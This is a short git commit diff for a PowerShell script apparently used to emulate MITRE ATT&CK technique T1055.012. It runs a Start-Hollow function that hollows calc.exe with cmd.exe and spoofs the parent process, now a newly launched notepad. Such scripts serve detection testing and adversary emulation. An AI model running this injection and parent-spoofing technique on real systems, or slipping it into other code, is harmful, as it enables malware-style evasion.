2b79fbd9f4c93bde5c0cd2a95102b431d52f45ca
olcsy <59606576+olcsy@users.noreply.github.com>
2021-05-31 23:33:35 +0300

    new files

--- mitre/T1055012/T1055012.ps1
+++ mitre/T1055012/T1055012.ps1
@@ -1,3 +1,3 @@
 .$env:TEMP\Start-Hollow.ps1
-$ppid=Get-Process "explorer.exe"
+$ppid=(Start-Process notepad -PassThru).id
 Start-Hollow -Sponsor "C:\Windows\System32\calc.exe" -Hollow "C:\Windows\System32\cmd.exe" -ParentPID $ppid -Verbose
